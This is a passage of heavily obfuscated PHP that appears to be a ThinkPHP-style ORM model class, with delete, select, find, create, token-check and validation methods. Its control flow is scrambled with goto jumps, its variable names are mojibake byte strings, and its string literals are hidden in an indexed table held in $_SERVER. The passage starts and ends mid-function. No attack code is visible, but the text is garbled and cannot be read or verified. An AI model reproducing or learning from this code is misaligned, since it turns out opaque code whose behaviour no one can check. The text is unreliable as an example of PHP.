_beforeUpdate(&$f¶ˆ‡ö²Ÿ†, $aƒÆää¥àÆ) { } protected function _afterUpdate($b‰Ô¸ƒ™…, $A©Ëˆ²À‘) { } public function delete($bßâöºèæ  = array()) { goto a­«êó­’ó; E‡™íì‚×: $b‰Š¤¨ºÔ¶ = $this->db->delete($bßâöºèæ ); if (!1 !== $b‰Š¤¨ºÔ¶) { $fÇñÖƒªêè = array(); if (isset($Bƒ£‚°¥¾)) { $fÇñÖƒªêè[$d™ åŒÇÍ] = $Bƒ£‚°¥¾; } $this->_after_delete($fÇñÖƒªêè, $bßâöºèæ ); } return $b‰Š¤¨ºÔ¶; goto bšÃÃõ½™‡; a­«êó­’ó: $b“º•ÃÆ±İ =& $_SERVER[Ïº«‚ßèÔˆø]; if (empty($bßâöºèæ ) && empty($this->options[$b“º•ÃÆ±İ[272]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $d™ åŒÇÍ = $this->getPk(); goto eŸ¿ß¸››±; eŸ¿ß¸››±: if (is_numeric($bßâöºèæ ) || is_string($bßâöºèæ )) { if (strpos($bßâöºèæ , $b“º•ÃÆ±İ[47])) { $f‘Æóö÷ÙŠ[$d™ åŒÇÍ] = array($b“º•ÃÆ±İ[273], $bßâöºèæ ); } else { $f‘Æóö÷ÙŠ[$d™ åŒÇÍ] = $bßâöºèæ ; } $this->options[$b“º•ÃÆ±İ[272]] = $f‘Æóö÷ÙŠ; } $bßâöºèæ  = $this->_parseOptions(); if (is_array($bßâöºèæ [$b“º•ÃÆ±İ[272]]) && isset($bßâöºèæ [$b“º•ÃÆ±İ[272]][$d™ åŒÇÍ])) { $Bƒ£‚°¥¾ = $bßâöºèæ [$b“º•ÃÆ±İ[272]][$d™ åŒÇÍ]; } goto E‡™íì‚×; bšÃÃõ½™‡: } protected function _after_delete($eâÆâÎ¾¯Ñ, $a£õóµ½ãã) { } public function select($bãÉë¦ÙËÖ = array()) { goto E³ˆ¸Ş§‡«; F¢…º­ÕÒ÷: $this->_afterSelect($A‘ÃË†¢÷, $bãÉë¦ÙËÖ); return $A‘ÃË†¢÷; goto C‡ÔØïŒå‹; E³ˆ¸Ş§‡«: $D£”óİ¶Ç =& $_SERVER[Ïº«‚ßèÔˆø]; if (is_string($bãÉë¦ÙËÖ) || is_numeric($bãÉë¦ÙËÖ)) { $cÌÀµ¢î©¹ = $this->getPk(); if (strpos($bãÉë¦ÙËÖ, $D£”óİ¶Ç[47])) { $bêÙ´‰ìº[$cÌÀµ¢î©¹] = array($D£”óİ¶Ç[273], $bãÉë¦ÙËÖ); } else { $bêÙ´‰ìº[$cÌÀµ¢î©¹] = $bãÉë¦ÙËÖ; } $this->options[$D£”óİ¶Ç[272]] = $bêÙ´‰ìº; } elseif (!1 === $bãÉë¦ÙËÖ) { $bãÉë¦ÙËÖ = $this->_parseOptions(); return $D£”óİ¶Ç[274] . $this->db->buildSelectSql($bãÉë¦ÙËÖ) . $D£”óİ¶Ç[275]; } $bãÉë¦ÙËÖ = $this->_parseOptions(); goto eÆ÷òİº‡ª; eÆ÷òİº‡ª: $A‘ÃË†¢÷ = $this->db->select($bãÉë¦ÙËÖ); if (!1 === $A‘ÃË†¢÷) { return !1; } if (empty($A‘ÃË†¢÷)) { return null; } goto F¢…º­ÕÒ÷; C‡ÔØïŒå‹: } protected function _afterSelect(&$bèˆ¥éåŒ‡, $eçÕİàáì ) { } public function buildSql($bÙÕğğµä = array()) { $AâŸœ¿¦Ö =& $_SERVER[Ïº«‚ßèÔˆø]; $bÙÕğğµä = $this->_parseOptions($bÙÕğğµä); return $AâŸœ¿¦Ö[274] . $this->db->buildSelectSql($bÙÕğğµä) . $AâŸœ¿¦Ö[275]; } public function optionsValue($E—å¼–¯Ñ = null) { if (is_null($E—å¼–¯Ñ)) { return $this->options; } elseif (is_array($E—å¼–¯Ñ)) { $this->options = array_merge($this->options, $E—å¼–¯Ñ); } } protected function _parseOptions($dŒâ¶ÎÒ»É = array()) { goto dÛ¹¸œ¡ß¢; e…¹©¨ó¸ò: if (isset($dŒâ¶ÎÒ»É[$f—Â©—ƒŠƒ[272]]) && is_array($dŒâ¶ÎÒ»É[$f—Â©—ƒŠƒ[272]]) && !empty($eª¬—»õÙ„) && !isset($dŒâ¶ÎÒ»É[$f—Â©—ƒŠƒ[279]]) && !isset($dŒâ¶ÎÒ»É[$f—Â©—ƒŠƒ[276]])) { foreach ($dŒâ¶ÎÒ»É[$f—Â©—ƒŠƒ[272]] as $a×º÷¢™ => $Cö®Ä“Í‰İ) { $a×º÷¢™ = trim($a×º÷¢™); if (in_array($a×º÷¢™, $eª¬—»õÙ„, !0)) { if (is_scalar($Cö®Ä“Í‰İ)) { $this->_parseType($dŒâ¶ÎÒ»É[$f—Â©—ƒŠƒ[272]], $a×º÷¢™); } } elseif (!is_numeric($a×º÷¢™) && $f—Â©—ƒŠƒ[71] != substr($a×º÷¢™, 0, 1) && !1 === strpos($a×º÷¢™, $f—Â©—ƒŠƒ[95]) && !1 === strpos($a×º÷¢™, $f—Â©—ƒŠƒ[257]) && !1 === strpos($a×º÷¢™, $f—Â©—ƒŠƒ[280]) && !1 === strpos($a×º÷¢™, $f—Â©—ƒŠƒ[281])) { unset($dŒâ¶ÎÒ»É[$f—Â©—ƒŠƒ[272]][$a×º÷¢™]); } } } $this->_options_filter($dŒâ¶ÎÒ»É); return $dŒâ¶ÎÒ»É; goto C˜òåÂ—¬; dÛ¹¸œ¡ß¢: $f—Â©—ƒŠƒ =& $_SERVER[Ïº«‚ßèÔˆø]; if (is_array($dŒâ¶ÎÒ»É)) { $dŒâ¶ÎÒ»É = array_merge($this->options, $dŒâ¶ÎÒ»É); } $this->options = array(); goto F‡ƒŒê¡›¶; F‡ƒŒê¡›¶: if (!isset($dŒâ¶ÎÒ»É[$f—Â©—ƒŠƒ[276]])) { $dŒâ¶ÎÒ»É[$f—Â©—ƒŠƒ[276]] = $this->getTableName(); $eª¬—»õÙ„ = $this->fields; } else { $eª¬—»õÙ„ = $this->getDbFields(); } if (!empty($dŒâ¶ÎÒ»É[$f—Â©—ƒŠƒ[277]])) { $dŒâ¶ÎÒ»É[$f—Â©—ƒŠƒ[276]] .= $f—Â©—ƒŠƒ[50] . $dŒâ¶ÎÒ»É[$f—Â©—ƒŠƒ[277]]; } $dŒâ¶ÎÒ»É[$f—Â©—ƒŠƒ[278]] = $this->name; goto e…¹©¨ó¸ò; C˜òåÂ—¬: } protected function _options_filter(&$EÄ ìòîµ¹) { } protected function _parseType(&$F¼öšãÕ¨˜, $Bâñ‘§Œ‰) { $f••ÅªÜ”› =& $_SERVER[Ïº«‚ßèÔˆø]; if (empty($this->options[$f••ÅªÜ”›[282]][$f••ÅªÜ”›[4] . $Bâñ‘§Œ‰])) { $e§™”°Û‚ = strtolower($this->fields[$f••ÅªÜ”›[249]][$Bâñ‘§Œ‰]); if (!1 !== strpos($e§™”°Û‚, $f••ÅªÜ”›[283])) { } elseif (!1 === strpos($e§™”°Û‚, $f••ÅªÜ”›[284]) && !1 !== strpos($e§™”°Û‚, $f••ÅªÜ”›[285])) { $F¼öšãÕ¨˜[$Bâñ‘§Œ‰] = intval($F¼öšãÕ¨˜[$Bâñ‘§Œ‰]); } elseif (!1 !== strpos($e§™”°Û‚, $f••ÅªÜ”›[286]) || !1 !== strpos($e§™”°Û‚, $f••ÅªÜ”›[287])) { $F¼öšãÕ¨˜[$Bâñ‘§Œ‰] = floatval($F¼öšãÕ¨˜[$Bâñ‘§Œ‰]); } elseif (!1 !== strpos($e§™”°Û‚, $f••ÅªÜ”›[288])) { $F¼öšãÕ¨˜[$Bâñ‘§Œ‰] = (bool) $F¼öšãÕ¨˜[$Bâñ‘§Œ‰]; } } } public function find($Eï«İºÒÒ½ = array()) { goto AÆïôÙ¥™Î; Dõç¹éËÂÛ: if (empty($aíÈ“à»ô)) { return null; } $this->data = $aíÈ“à»ô[0]; $this->_afterFind($this->data, $Eï«İºÒÒ½); goto f£¢è¥çâ; f£¢è¥çâ: if (!empty($this->options[$a¤ˆ‘ÎÄŞ[290]])) { return $this->returnResult($this->data, $this->options[$a¤ˆ‘ÎÄŞ[290]]); } return $this->data; goto A²„§ÙËÉ£; AÆïôÙ¥™Î: $a¤ˆ‘ÎÄŞ =& $_SERVER[Ïº«‚ßèÔˆø]; if (is_numeric($Eï«İºÒÒ½) || is_string($Eï«İºÒÒ½)) { $B«»–ÈÕç[$this->getPk()] = intval($Eï«İºÒÒ½); $this->options[$a¤ˆ‘ÎÄŞ[272]] = $B«»–ÈÕç; } $this->options[$a¤ˆ‘ÎÄŞ[289]] = 1; goto eğ§ÁØ¬Ì‘; eğ§ÁØ¬Ì‘: $Eï«İºÒÒ½ = $this->_parseOptions(); $aíÈ“à»ô = $this->db->select($Eï«İºÒÒ½); if (!1 === $aíÈ“à»ô) { return !1; } goto Dõç¹éËÂÛ; A²„§ÙËÉ£: } protected function _afterFind(&$b»½ôö¥šî, $B´ò»à°›ª) { } protected function returnResult($a¶êØ¬¶í, $eãøÃç‘İ® = '') { $e©¯ä¦Ù‡‡ =& $_SERVER[Ïº«‚ßèÔˆø]; if ($eãøÃç‘İ®) { if (is_callable($eãøÃç‘İ®)) { return call_user_func($eãøÃç‘İ®, $a¶êØ¬¶í); } switch (strtolower($eãøÃç‘İ®)) { case $e©¯ä¦Ù‡‡[291]: return json_encode($a¶êØ¬¶í); case $e©¯ä¦Ù‡‡[292]: return xml_encode($a¶êØ¬¶í); } } return $a¶êØ¬¶í; } public function parseFieldsMap($Aå£ŠƒÉ×‹, $Bª‹¨ïµª = 1) { if (!empty($this->_map)) { foreach ($this->_map as $B°×õ×ÜÊî => $aòÄÎ­åà) { if ($Bª‹¨ïµª == 1) { if (isset($Aå£ŠƒÉ×‹[$aòÄÎ­åà])) { $Aå£ŠƒÉ×‹[$B°×õ×ÜÊî] = $Aå£ŠƒÉ×‹[$aòÄÎ­åà]; unset($Aå£ŠƒÉ×‹[$aòÄÎ­åà]); } } else { if (isset($Aå£ŠƒÉ×‹[$B°×õ×ÜÊî])) { $Aå£ŠƒÉ×‹[$aòÄÎ­åà] = $Aå£ŠƒÉ×‹[$B°×õ×ÜÊî]; unset($Aå£ŠƒÉ×‹[$B°×õ×ÜÊî]); } } } } return $Aå£ŠƒÉ×‹; } public function setField($EÓË§Íƒ‰³, $B×©šğÉó = '') { if (is_array($EÓË§Íƒ‰³)) { $a‹ ¿Ì˜ÁÆ = $EÓË§Íƒ‰³; } else { $a‹ ¿Ì˜ÁÆ[$EÓË§Íƒ‰³] = $B×©šğÉó; } return $this->save($a‹ ¿Ì˜ÁÆ); } public function setAdd($CââĞİœÈï, $BÍÒŸª®®» = 1) { $fŸòØœìÊ =& $_SERVER[Ïº«‚ßèÔˆø]; $dºõëáêÙÂ = $CââĞİœÈï . $fŸòØœìÊ[293] . $BÍÒŸª®®»; if ($BÍÒŸª®®» < 0) { $dºõëáêÙÂ = $CââĞİœÈï . $BÍÒŸª®®»; } return $this->setField($CââĞİœÈï, array($fŸòØœìÊ[294], $dºõëáêÙÂ)); } public function getField($fƒŸĞàÑ©“, $E†ó†ºô¬ = null) { $eö»£¼”¦ë =& $_SERVER[Ïº«‚ßèÔˆø]; $cÙêÌ³êâ†[$eö»£¼”¦ë[270]] = $fƒŸĞàÑ©“; $cÙêÌ³êâ† = $this->_parseOptions($cÙêÌ³êâ†); $fƒŸĞàÑ©“ = trim($fƒŸĞàÑ©“); if (strpos($fƒŸĞàÑ©“, $eö»£¼”¦ë[47])) { if (!isset($cÙêÌ³êâ†[$eö»£¼”¦ë[289]])) { $cÙêÌ³êâ†[$eö»£¼”¦ë[289]] = is_numeric($E†ó†ºô¬) ? $E†ó†ºô¬ : $eö»£¼”¦ë[33]; } $e±“è±‰ = $this->db->select($cÙêÌ³êâ†); if (!empty($e±“è±‰)) { goto E›¾´Ò•ŸË; FºÇ¨—Í±×: foreach ($e±“è±‰ as $C°Äó£İÑÌ) { $a©ğ«Ö×ØÙ = $C°Äó£İÑÌ[$dÊÕƒå‚½]; if (2 == $CÙŒÕ²ñ‰ö) { $C¬ƒ¿†­Ô[$a©ğ«Ö×ØÙ] = $C°Äó£İÑÌ[$F¼‚·†òˆ]; } else { $C¬ƒ¿†­Ô[$a©ğ«Ö×ØÙ] = is_string($E†ó†ºô¬) ? implode($E†ó†ºô¬, $C°Äó£İÑÌ) : $C°Äó£İÑÌ; } } return $C¬ƒ¿†­Ô; goto CĞÕ´¡–“; fÚùÎÔà‰«: $F¼‚·†òˆ = array_shift($fƒŸĞàÑ©“); $C¬ƒ¿†­Ô = array(); $CÙŒÕ²ñ‰ö = count($fÅïÍºÒĞ¯); goto FºÇ¨—Í±×; E›¾´Ò•ŸË: $fÅïÍºÒĞ¯ = explode($eö»£¼”¦ë[47], $fƒŸĞàÑ©“); $fƒŸĞàÑ©“ = array_keys($e±“è±‰[0]); $dÊÕƒå‚½ = array_shift($fƒŸĞàÑ©“); goto fÚùÎÔà‰«; CĞÕ´¡–“: } } else { if (!0 !== $E†ó†ºô¬) { $cÙêÌ³êâ†[$eö»£¼”¦ë[289]] = is_numeric($E†ó†ºô¬) ? $E†ó†ºô¬ : 1; } if ($E†ó†ºô¬ === $eö»£¼”¦ë[252]) { unset($cÙêÌ³êâ†[$eö»£¼”¦ë[289]]); } $C°Äó£İÑÌ = $this->db->select($cÙêÌ³êâ†); if (!empty($C°Äó£İÑÌ)) { if ($E†ó†ºô¬ === $eö»£¼”¦ë[252]) { return reset($C°Äó£İÑÌ[0]); } if (!0 !== $E†ó†ºô¬ && 1 == $cÙêÌ³êâ†[$eö»£¼”¦ë[289]]) { return reset($C°Äó£İÑÌ[0]); } foreach ($C°Äó£İÑÌ as $B‹ÎœÑ¦ª) { $fÙõòÖî[] = $B‹ÎœÑ¦ª[$fƒŸĞàÑ©“]; } return $fÙõòÖî; } } return null; } public function create($a©Ğ¬“ŞÔ¹ = '', $bÃöä‘‘Ä¦ = '') { goto bì‚Öù¦˜; CÚ´¨º¼ßœ: return $a©Ğ¬“ŞÔ¹; goto B”¸¢ŸªĞ¼; bì‚Öù¦˜: $CÒ§’èèæ„ =& $_SERVER[Ïº«‚ßèÔˆø]; if (empty($a©Ğ¬“ŞÔ¹)) { $a©Ğ¬“ŞÔ¹ = $_POST; } elseif (is_object($a©Ğ¬“ŞÔ¹)) { $a©Ğ¬“ŞÔ¹ = get_object_vars($a©Ğ¬“ŞÔ¹); } if (empty($a©Ğ¬“ŞÔ¹) || !is_array($a©Ğ¬“ŞÔ¹)) { $this->error = think_lang($CÒ§’èèæ„[268]); return !1; } goto e²Ÿ†ŞÉ«; EÁñËÔÀç: if ($this->autoCheckFields) { $d«µ¿ŞùêË = $this->getDbFields(); foreach ($a©Ğ¬“ŞÔ¹ as $CÁ¨ìÛ¹æ => $cŒÌœŞñÃ) { if (!in_array($CÁ¨ìÛ¹æ, $d«µ¿ŞùêË)) { unset($a©Ğ¬“ŞÔ¹[$CÁ¨ìÛ¹æ]); } elseif (MAGIC_QUOTES_GPC && is_string($cŒÌœŞñÃ)) { $a©Ğ¬“ŞÔ¹[$CÁ¨ìÛ¹æ] = stripslashes($cŒÌœŞñÃ); } } } $this->autoOperation($a©Ğ¬“ŞÔ¹, $bÃöä‘‘Ä¦); $this->data = $a©Ğ¬“ŞÔ¹; goto CÚ´¨º¼ßœ; cÓè„Øß‘: if (isset($d«µ¿ŞùêË)) { if (is_string($d«µ¿ŞùêË)) { $d«µ¿ŞùêË = explode($CÒ§’èèæ„[47], $d«µ¿ŞùêË); } if (think_config($CÒ§’èèæ„[295])) { $d«µ¿ŞùêË[] = think_config($CÒ§’èèæ„[296]); } foreach ($a©Ğ¬“ŞÔ¹ as $CÁ¨ìÛ¹æ => $cŒÌœŞñÃ) { if (!in_array($CÁ¨ìÛ¹æ, $d«µ¿ŞùêË)) { unset($a©Ğ¬“ŞÔ¹[$CÁ¨ìÛ¹æ]); } } } if (!$this->autoValidation($a©Ğ¬“ŞÔ¹, $bÃöä‘‘Ä¦)) { return !1; } if (!$this->autoCheckToken($a©Ğ¬“ŞÔ¹)) { $this->error = think_lang($CÒ§’èèæ„[297]); return !1; } goto EÁñËÔÀç; e²Ÿ†ŞÉ«: $a©Ğ¬“ŞÔ¹ = $this->parseFieldsMap($a©Ğ¬“ŞÔ¹, 0); $bÃöä‘‘Ä¦ = $bÃöä‘‘Ä¦ ? $bÃöä‘‘Ä¦ : (!empty($a©Ğ¬“ŞÔ¹[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$CÒ§’èèæ„[270]])) { $d«µ¿ŞùêË = $this->options[$CÒ§’èèæ„[270]]; unset($this->options[$CÒ§’èèæ„[270]]); } elseif ($bÃöä‘‘Ä¦ == THINK_MODEL_INSERT && isset($this->insertFields)) { $d«µ¿ŞùêË = $this->insertFields; } elseif ($bÃöä‘‘Ä¦ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $d«µ¿ŞùêË = $this->updateFields; } goto cÓè„Øß‘; B”¸¢ŸªĞ¼: } public function autoCheckToken($E¶š‡¤šÏ¥) { $bõ‹í¹­©‰ =& $_SERVER[Ïº«‚ßèÔˆø]; if (isset($this->options[$bõ‹í¹­©‰[298]]) && !$this->options[$bõ‹í¹­©‰[298]]) { return !0; } if (think_config($bõ‹í¹­©‰[295])) { $CÃÒÛ‹¼†Á = think_config($bõ‹í¹­©‰[296]); if (!isset($E¶š‡¤šÏ¥[$CÃÒÛ‹¼†Á]) || Session::get($CÃÒÛ‹¼†Á)) { return !1; } list($cëØÃ˜ØÑ, $cĞƒîœíœ) = explode($bõ‹í¹­©‰[71], $E¶š‡¤šÏ¥[$CÃÒÛ‹¼†Á]); if ($cĞƒîœíœ && Session::get($CÃÒÛ‹¼†Á . $bõ‹í¹­©‰[95] . $cëØÃ˜ØÑ) === $cĞƒîœíœ) { Session::remove($CÃÒÛ‹¼†Á . $bõ‹í¹­©‰[95] . $cëØÃ˜ØÑ); return !0; } if (think_config($bõ‹í¹­©‰[299])) { Session::remove($CÃÒÛ‹¼†Á . $bõ‹í¹­©‰[95] . $cëØÃ˜ØÑ); } return !1; } return !0; } public function regex($BÏÎÎÖ”«, $E¨Œ‘Ë»ï) { $D„Æ“¬ÜÏ© =& $_SERVER[Ïº«‚ßèÔˆø]; $cŞ¸¼´§Š§ = array($D„Æ“¬ÜÏ©[300] => $D„Æ“¬ÜÏ©[301], $D„Æ“¬ÜÏ©[302] => $D„Æ“¬ÜÏ©[303], $D„Æ“¬ÜÏ©[304] => $D„Æ“¬ÜÏ©[305], $D„Æ“¬ÜÏ©[306] => $D„Æ“¬ÜÏ©[307], $D„Æ“¬ÜÏ©[308] => $D„Æ“¬ÜÏ©[309], $D„Æ“¬ÜÏ©[310] => $D„Æ“¬ÜÏ©[311], $D„Æ“¬ÜÏ©[312] => $D„Æ“¬ÜÏ©[313], $D„Æ“¬ÜÏ©[287] => $D„Æ“¬ÜÏ©[314], $D„Æ“¬ÜÏ©[315] => $D„Æ“¬ÜÏ©[316]); if (isset($cŞ¸¼´§Š§[strtolower($E¨Œ‘Ë»ï)])) { $E¨Œ‘Ë»ï = $cŞ¸¼´§Š§[strtolower($E¨Œ‘Ë»ï)]; } return preg_match($E¨Œ‘Ë»ï, $BÏÎÎÖ”«) === 1; } private function autoOperation(&$bÕ¹‹›²œ†, $Dó¾·¿Ïƒ…) { $bŸó©…¶×¡ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!empty($this->options[$bŸó©…¶×¡[317]])) { $AİíÖÏˆê = $this->options[$bŸó©…¶×¡[317]]; unset($this->options[$bŸó©…¶×¡[317]]); } elseif (!empty($this->_auto)) { $AİíÖÏˆê = $this->_auto; } if (isset($AİíÖÏˆê)) { foreach ($AİíÖÏˆê as $CŸ»–ÂŠ¬×) { if (empty($CŸ»–ÂŠ¬×[2])) { $CŸ»–ÂŠ¬×[2] = THINK_MODEL_INSERT; } if ($Dó¾·¿Ïƒ… == $CŸ»–ÂŠ¬×[2] || $CŸ»–ÂŠ¬×[2] == THINK_MODEL_BOTH) { switch (trim($CŸ»–ÂŠ¬×[3])) { case $bŸó©…¶×¡[318]: case $bŸó©…¶×¡[319]: $c„Â´Ç• = isset($CŸ»–ÂŠ¬×[4]) ? (array) $CŸ»–ÂŠ¬×[4] : array(); if (isset($bÕ¹‹›²œ†[$CŸ»–ÂŠ¬×[0]])) { array_unshift($c„Â´Ç•, $bÕ¹‹›²œ†[$CŸ»–ÂŠ¬×[0]]); } if ($bŸó©…¶×¡[318] == $CŸ»–ÂŠ¬×[3]) { $bÕ¹‹›²œ†[$CŸ»–ÂŠ¬×[0]] = call_user_func_array($CŸ»–ÂŠ¬×[1], $c„Â´Ç•); } else { $bÕ¹‹›²œ†[$CŸ»–ÂŠ¬×[0]] = call_user_func_array(array(&$this, $CŸ»–ÂŠ¬×[1]), $c„Â´Ç•); } break; case $bŸó©…¶×¡[270]: $bÕ¹‹›²œ†[$CŸ»–ÂŠ¬×[0]] = $bÕ¹‹›²œ†[$CŸ»–ÂŠ¬×[1]]; break; case $bŸó©…¶×¡[320]: if ($bŸó©…¶×¡[33] === $bÕ¹‹›²œ†[$CŸ»–ÂŠ¬×[0]]) { unset($bÕ¹‹›²œ†[$CŸ»–ÂŠ¬×[0]]); } break; case $bŸó©…¶×¡[321]: default: $bÕ¹‹›²œ†[$CŸ»–ÂŠ¬×[0]] = $CŸ»–ÂŠ¬×[1]; } if (!1 === $bÕ¹‹›²œ†[$CŸ»–ÂŠ¬×[0]]) { unset($bÕ¹‹›²œ†[$CŸ»–ÂŠ¬×[0]]); } } } } return $bÕ¹‹›²œ†; } protected function autoValidation($dŞÒ®ØõŸ, $a‘–áºÜô¦) { $b¬ô£´¨ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!empty($this->options[$b¬ô£´¨[322]])) { $E½¾—Ÿ’Ù¾ = $this->options[$b¬ô£´¨[322]]; unset($this->options[$b¬ô£´¨[322]]); } elseif (!empty($this->_validate)) { $E½¾—Ÿ’Ù¾ = $this->_validate; } if (isset($E½¾—Ÿ’Ù¾)) { if ($this->patchValidate) { $this->error = array(); } foreach ($E½¾—Ÿ’Ù¾ as $c¦ºÔ”˜æñ => $B¶„„Š•Š) { if (empty($B¶„„Š•Š[5]) || $B¶„„Š•Š[5] == THINK_MODEL_BOTH || $B¶„„Š•Š[5] == $a‘–áºÜô¦) { if (0 == strpos($B¶„„Š•Š[2], $b¬ô£´¨[323]) && strpos($B¶„„Š•Š[2], $b¬ô£´¨[324])) { $B¶„„Š•Š[2] = think_lang(substr($B¶„„Š•Š[2], 2, -1)); } $B¶„„Š•Š[3] = isset($B¶„„Š•Š[3]) ? $B¶„„Š•Š[3] : THINK_EXISTS_VALIDATE; $B¶„„Š•Š[4] = isset($B¶„„Š•Š[4]) ? $B¶„„Š•Š[4] : $b¬ô£´¨[325]; switch ($B¶„„Š•Š[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($dŞÒ®ØõŸ, $B¶„„Š•Š)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($b¬ô£´¨[33] != trim($dŞÒ®ØõŸ[$B¶„„Š•Š[0]])) { if (!1 === $this->_validationField($dŞÒ®ØõŸ, $B¶„„Š•Š)) { return !1; } } break; default: if (isset($dŞÒ®ØõŸ[$B¶„„Š•Š[0]])) { if (!1 === $this->_validationField($dŞÒ®ØõŸ, $B¶„„Š•Š)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($E” Šô›¡½, $Eà‹¹¹»›) { if (!1 === $this->_validationFieldItem($E” Šô›¡½, $Eà‹¹¹»›)) { if ($this->patchValidate) { $this->error[$Eà‹¹¹»›[0]] = $Eà‹¹¹»›[2]; } else { $this->error = $Eà‹¹¹»›[2]; return !1; } } return; } protected function _validationFieldItem($AÎÌ´‚®Îø, $E¤‚¸ÁŠ¿) { $AªÆù½ËÖõ =& $_SERVER[Ïº«‚ßèÔˆø]; switch (strtolower(trim($E¤‚¸ÁŠ¿[4]))) { case $AªÆù½ËÖõ[318]: case $AªÆù½ËÖõ[319]: $cêù÷ÓÙË = isset($E¤‚¸ÁŠ¿[6]) ? (array) $E¤‚¸ÁŠ¿[6] : array(); if (is_string($E¤‚¸ÁŠ¿[0]) && strpos($E¤‚¸ÁŠ¿[0], $AªÆù½ËÖõ[47])) { $E¤‚¸ÁŠ¿[0] = explode($AªÆù½ËÖõ[47], $E¤‚¸ÁŠ¿[0]); } if (is_array($E¤‚¸ÁŠ¿[0])) { foreach ($E¤‚¸ÁŠ¿[0] as $F°¥»ĞÙ½) { $Fíš·Îçº™[$F°¥»ĞÙ½] = $AÎÌ´‚®Îø[$F°¥»ĞÙ½]; } array_unshift($cêù÷ÓÙË, $Fíš·Îçº™); } else { array_unshift($cêù÷ÓÙË, $AÎÌ´‚®Îø[$E¤‚¸ÁŠ¿[0]]); } if ($AªÆù½ËÖõ[318] == $E¤‚¸ÁŠ¿[4]) { return call_user_func_array($E¤‚¸ÁŠ¿[1], $cêù÷ÓÙË); } else { return call_user_func_array(array(&$this, $E¤‚¸ÁŠ¿[1]), $cêù÷ÓÙË); } case $AªÆù½ËÖõ[326]: return $AÎÌ´‚®Îø[$E¤‚¸ÁŠ¿[0]] == $AÎÌ´‚®Îø[$E¤‚¸ÁŠ¿[1]]; case $AªÆù½ËÖõ[327]: if (is_string($E¤‚¸ÁŠ¿[0]) && strpos($E¤‚¸ÁŠ¿[0], $AªÆù½ËÖõ[47])) { $E¤‚¸ÁŠ¿[0] = explode($AªÆù½ËÖõ[47], $E¤‚¸ÁŠ¿[0]); } $BÖ”…·¨ÖÄ = array(); if (is_array($E¤‚¸ÁŠ¿[0])) { foreach ($E¤‚¸ÁŠ¿[0] as $F°¥»ĞÙ½) { $BÖ”…·¨ÖÄ[$F°¥»ĞÙ½] = $AÎÌ´‚®Îø[$F°¥»ĞÙ½]; } } else { $BÖ”…·¨ÖÄ[$E¤‚¸ÁŠ¿[0]] = $AÎÌ´‚®Îø[$E¤‚¸ÁŠ¿[0]]; } if (!empty($AÎÌ´‚®Îø[$this->getPk()])) { $BÖ”…·¨ÖÄ[$this->getPk()] = array($AªÆù½ËÖõ[328], $AÎÌ´‚®Îø[$this->getPk()]); } if ($this->where($BÖ”…·¨ÖÄ)->find()) { return !1; } return !0; default: return $this->check($AÎÌ´‚®Îø[$E¤‚¸ÁŠ¿[0]], $E¤‚¸ÁŠ¿[1], $E¤‚¸ÁŠ¿[4]); } } public function check($bæßïíÁÓ, $e¡Üø‘‰Ã, $CòöÍ•š†¾ = "\x72\x65\x67\145\x78") { $eˆÈ†Îî•å =& $_SERVER[Ïº«‚ßèÔˆø]; $CòöÍ•š†¾ = strtolower(trim($CòöÍ•š†¾)); switch ($CòöÍ•š†¾) { case $eˆÈ†Îî•å[7]: case $eˆÈ†Îî•å[329]: $FØ’†£ = is_array($e¡Üø‘‰Ã) ? $e¡Üø‘‰Ã : explode($eˆÈ†Îî•å[47], $e¡Üø‘‰Ã); return $CòöÍ•š†¾ == $eˆÈ†Îî•å[7] ? in_array($bæßïíÁÓ, $FØ’†£) : !in_array($bæßïíÁÓ, $FØ’†£); case $eˆÈ†Îî•å[330]: case $eˆÈ†Îî•å[331]: if (is_array($e¡Üø‘‰Ã)) { $d¯šŠ‡¦ = $e¡Üø‘‰Ã[0]; $d¹µšÍ‚Š¨ = $e¡Üø‘‰Ã[1]; } else { list($d¯šŠ‡¦, $d¹µšÍ‚Š¨) = explode($eˆÈ†Îî•å[47], $e¡Üø‘‰Ã); } return $CòöÍ•š†¾ == $eˆÈ†Îî•å[330] ? $bæßïíÁÓ >= $d¯šŠ‡¦ && $bæßïíÁÓ <= $d¹µšÍ‚Š¨ : $bæßïíÁÓ < $d¯šŠ‡¦ || $bæßïíÁÓ > $d¹µšÍ‚Š¨; case $eˆÈ†Îî•å[332]: case $eˆÈ†Îî•å[333]: return $CòöÍ•š†¾ == $eˆÈ†Îî•å[332] ? $bæßïíÁÓ == $e¡Üø‘‰Ã : $bæßïíÁÓ != $e¡Üø‘‰Ã; case $eˆÈ†Îî•å[334]: $D†íßÇ¹˜ª = mb_strlen($bæßïíÁÓ, $eˆÈ†Îî•å[335]); if (strpos($e¡Üø‘‰Ã, $eˆÈ†Îî•å[47])) { list($d¯šŠ‡¦, $d¹µšÍ‚Š¨) = explode($eˆÈ†Îî•å[47], $e¡Üø‘‰Ã); return $D†íßÇ¹˜ª >= $d¯šŠ‡¦ && $D†íßÇ¹˜ª <= $d¹µšÍ‚Š¨; } else { return $D†íßÇ¹˜ª == $e¡Üø‘‰Ã; } case $eˆÈ†Îî•å[336]: list($CÃ­ÇÉÇƒ, $cá²‹Œ) = explode($eˆÈ†Îî•å[47], $e¡Üø‘‰Ã); if (!is_numeric($CÃ­ÇÉÇƒ)) { $CÃ­ÇÉÇƒ = strtotime($CÃ­ÇÉÇƒ); } if (!is_numeric($cá²‹Œ)) { $cá²‹Œ = strtotime($cá²‹Œ); } return NOW_TIME >= $CÃ­ÇÉÇƒ && NOW_TIME <= $cá²‹Œ; case $eˆÈ†Îî•å[337]: return in_array(get_client_ip(), explode($eˆÈ†Îî•å[47], $e¡Üø‘‰Ã)); case $eˆÈ†Îî•å[338]: return !in_array(get_client_ip(), explode($eˆÈ†Îî•å[47], $e¡Üø‘‰Ã)); case $eˆÈ†Îî•å[325]: default: return $this->regex($bæßïíÁÓ, $e¡Üø‘‰Ã); } } public function query($a¦ãç Õ—, $BËÅù±¥ì÷ = false) { $f›¨Ò ñõ =& 